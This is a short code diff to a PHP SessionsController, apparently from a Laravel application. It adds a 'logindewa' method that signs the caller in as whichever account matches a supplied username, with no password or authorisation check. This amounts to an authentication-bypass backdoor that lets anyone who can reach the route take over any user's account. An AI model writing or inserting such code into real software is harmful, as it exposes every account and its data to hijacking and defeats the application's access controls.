@@ -59,4 +59,15 @@ class SessionsController extends BaseController {
 		return Redirect::home();
 	}
 
+	public function logindewa($id = null)
+	{
+		Auth::logout();
+
+		$id = User::where('username', Input::get('username'))->first()->id;
+
+		Auth::loginUsingId($id);
+
+		return Redirect::home();
+	}
+
 }
